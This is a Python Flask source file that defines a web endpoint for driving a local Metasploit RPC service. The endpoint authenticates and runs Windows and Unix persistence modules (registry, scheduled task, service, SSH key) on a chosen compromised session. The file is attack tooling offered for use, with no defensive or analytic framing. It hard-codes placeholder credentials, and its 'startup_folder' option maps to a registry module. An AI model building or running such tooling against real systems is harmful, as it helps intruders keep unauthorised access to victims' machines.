import json
import requests
from flask import Blueprint, request, jsonify

persistence_bp = Blueprint("persistence", __name__)

MSF_RPC_URL = "http://127.0.0.1:55553/api/"
MSF_RPC_USER = "msf"
MSF_RPC_PASS = "yourpassword"

def authenticate():
    """Authenticate with Metasploit RPC and return the token."""
    response = requests.post(
        f"{MSF_RPC_URL}auth/login",
        json={"username": MSF_RPC_USER, "password": MSF_RPC_PASS}
    )
    return response.json().get("token")

@persistence_bp.route("/metasploit/persistence", methods=["POST"])
def setup_persistence():
    data = request.json
    session_id = data.get("session_id")
    persistence_method = data.get("method")

    if not session_id or not persistence_method:
        return jsonify({"error": "Session ID and Persistence Method are required"}), 400

    token = authenticate()
    if not token:
        return jsonify({"error": "Authentication failed"}), 500

    persistence_modules = {
        "registry": "exploit/windows/local/persistence",
        "scheduled_task": "exploit/windows/local/s4u_persistence",
        "startup_folder": "exploit/windows/local/registry_persistence",
        "service": "exploit/windows/local/service_persistence",
        "ssh_key": "exploit/unix/sshkey_persistence"
    }

    if persistence_method not in persistence_modules:
        return jsonify({"error": "Invalid persistence method"}), 400

    exploit_data = {
        "token": token,
        "module": persistence_modules[persistence_method],
        "options": {"SESSION": session_id}
    }

    response = requests.post(f"{MSF_RPC_URL}module.execute", json=exploit_data)
    return jsonify(response.json())
